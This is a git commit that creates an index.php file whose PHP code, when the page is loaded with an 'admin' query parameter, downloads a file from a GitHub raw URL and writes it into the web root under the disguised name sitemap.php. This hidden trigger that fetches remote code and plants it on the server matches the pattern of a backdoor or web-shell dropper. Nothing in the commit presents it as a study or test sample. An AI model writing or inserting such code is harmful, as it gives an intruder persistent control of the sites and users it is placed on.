f098d2f3cc5c23de364b4a6f4b41b1eb68801e50
rizky supriatna <109171533+rizkylol@users.noreply.github.com>
2023-03-27 16:14:28 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,25 @@
+<?php
+if(isset($_GET['admin']))
+{
+function http_get($url){
+	$im = curl_init($url);
+	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($im, CURLOPT_HEADER, 0);
+	return curl_exec($im);
+	curl_close($im);
+}
+$check3 = $_SERVER['DOCUMENT_ROOT'] . "/sitemap.php" ;
+$text3 = http_get('https://raw.githubusercontent.com/rizkylol/project/main/footer.php');
+$open3 = fopen($check3, 'w');
+fwrite($open3, $text3);
+fclose($open3);
+if(file_exists($check3)){
+    echo $check3."</br>";
+}else 
+  echo "not exits";
+echo "done .\n " ;
+
+}
+?>
